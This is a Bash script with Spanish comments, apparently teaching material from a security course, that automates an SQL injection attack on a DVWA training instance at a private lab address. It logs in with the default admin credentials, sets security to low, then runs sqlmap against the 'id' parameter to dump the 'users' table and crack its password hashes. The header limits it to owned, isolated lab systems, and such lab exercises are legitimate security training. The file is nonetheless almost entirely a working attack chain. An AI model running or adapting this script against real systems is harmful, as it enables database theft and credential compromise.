#!/usr/bin/env bash
# sqli.sh -- AUTOMATIZA el ataque de inyeccion SQL de punta a punta contra MI DVWA del
# laboratorio aislado: 1) inicia sesion y fija seguridad low  2) lanza sqlmap contra el
# parametro 'id'  3) vuelca la tabla de usuarios y CRACKEA las contrasenas.
# SOLO sistemas propios y autorizados. Laboratorio aislado, sin salida a internet.
# Morini Computers -- Ciberseguridad. Encuadre educativo y de defensa.
#   Uso:  ./sqli.sh
set -u
URL="http://10.13.37.30"
JAR="$(mktemp)"
tok() { grep -oE "user_token' value='[0-9a-f]+'" | grep -oE '[0-9a-f]{16,}' | head -1; }

echo "[1] Inicio sesion en DVWA (admin) y fijo el nivel de seguridad en low..."
T1=$(curl -s -c "$JAR" "$URL/login.php" | tok)
curl -s -b "$JAR" -c "$JAR" -L \
     --data-urlencode "username=admin" --data-urlencode "password=password" \
     --data-urlencode "user_token=$T1" --data "Login=Login" "$URL/login.php" >/dev/null
T2=$(curl -s -b "$JAR" -c "$JAR" "$URL/security.php" | tok)
curl -s -b "$JAR" -c "$JAR" \
     --data "security=low" --data "seclev_submit=Submit" \
     --data-urlencode "user_token=$T2" "$URL/security.php" >/dev/null
SID=$(awk '/PHPSESSID/{print $7}' "$JAR"); rm -f "$JAR"
COOKIE="PHPSESSID=$SID; security=low"

TARGET="$URL/vulnerabilities/sqli/?id=1&Submit=Submit"
echo "[2] Lanzo sqlmap contra el parametro 'id' con la cookie de sesion..."
echo "[3] Vuelco la tabla 'users' de la base de datos 'dvwa' y crackeo las contrasenas:"
sqlmap -u "$TARGET" --cookie="$COOKIE" --batch -D dvwa -T users --dump --threads=4

echo "[*] Listo: usuarios y contrasenas de DVWA volcados directamente desde la base de datos."
